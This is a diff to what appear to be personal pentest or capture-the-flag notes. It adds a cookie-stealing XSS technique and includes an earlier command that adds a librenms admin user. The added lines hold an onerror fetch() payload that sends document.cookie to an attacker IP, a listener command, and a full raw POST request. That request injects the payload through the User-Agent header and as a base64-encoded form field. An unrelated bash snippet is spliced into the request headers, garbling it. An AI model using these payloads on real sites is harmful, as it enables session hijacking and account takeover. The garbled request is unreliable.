@@ -257,5 +257,34 @@ In librenms, adduser admin user is
 -------------------------------------
 #cd /opt/librenms
 #./adduser.php test test123 10  (level 10 is admin)
+____________________________________________________________________________________________________________________________________________
+Sometimes add XSS payload in User-Agent and User-Input session to get admin-cookie:
+------------------------------------------------------------------------------------
+<img src=x onerror=fetch('http://yourIP/?c='+document.cookie);>
 
+Host the server
+#php -S 0.0.0.0:80
+
+
+POST /support HTTP/1.1
+Host: 10.10.11.8:5000
+User-Agent: <img src=x onerror=fetch('http://10.10.16.25/?c='+document.cookie);>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 170
+Origin: http://10.10.11.8:5000
+Connection: closeif ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
+  /usr/bin/echo "Database service is not running. Starting it..."
+  ./initdb.sh 2>/dev/null
+else
+  /usr/bin/echo "Database service is running."
+fi
+
+Referer: http://10.10.11.8:5000/support
+Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
+Upgrade-Insecure-Requests: 1
+
+fname=test&lname=test1&email=test%40gmail.com&phone=093847576&message=Hihello;PGltZyBzcmM9eCBvbmVycm9yPWZldGNoKCdodHRwOi8vMTAuMTAuMTYuMjUvP2M9Jytkb2N1bWVudC5jb29raWUpOz4=
 
